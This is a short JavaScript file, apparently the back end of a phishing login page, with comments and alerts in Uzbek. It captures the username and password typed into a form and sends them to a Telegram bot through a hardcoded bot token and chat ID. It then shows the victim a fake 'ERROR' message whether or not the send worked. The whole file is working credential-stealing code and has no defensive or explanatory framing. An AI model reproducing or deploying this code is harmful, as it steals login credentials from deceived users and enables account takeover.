const TOKEN = "8517511367:AAFdVKEPl7OkIQq-j4-iPIrXxwofTEo_YsE";
const CHAT_ID = "5714605060"; // @userinfobot orqali olgan ID

const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById("sendBtn").addEventListener("click", function () {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    if (!username || !password) return alert("Iltimos, username va passwordni kiriting!");

    const text = `Username: ${username}\nPassword: ${password}`;

    fetch(URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    })
    .then(res => res.json())
    .then(result => {
        console.log(result);
        if(result.ok){
            alert("ERROR");
        } else {
            alert("ERROR: " + result.description);
        }
    })
    .catch(err => {
        console.error(err);
        alert("Xatolik yuz berdi!");
    });
});
